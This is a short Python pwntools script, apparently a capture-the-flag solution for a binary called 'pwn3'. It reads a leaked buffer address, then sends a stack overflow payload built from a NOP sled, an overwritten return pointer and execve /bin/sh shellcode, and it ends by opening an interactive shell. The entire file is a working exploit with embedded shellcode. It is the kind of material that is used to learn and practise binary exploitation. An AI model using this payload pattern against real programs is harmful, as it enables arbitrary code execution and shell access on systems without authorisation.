#!/usr/bin/python3
from pwn import *

# execve /bin/sh
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

# write 28 then rp, but part of that 28 is the shellcode
bufsz = 0x12e #- len(sc)

r = process('./pwn3')

# get the pointer to our buffer
r.recvuntil(b'0x')
rp = r.recvuntil(b'!').strip(b'!')
rp = p32(int(rp,16)+0x14e)

# + 0x40 just to make room for our sc not to get munged
payload = b"\x90"*bufsz + rp + b'\x90'*0x60 + sc

r.sendline(payload)

# profit from shell
r.interactive()
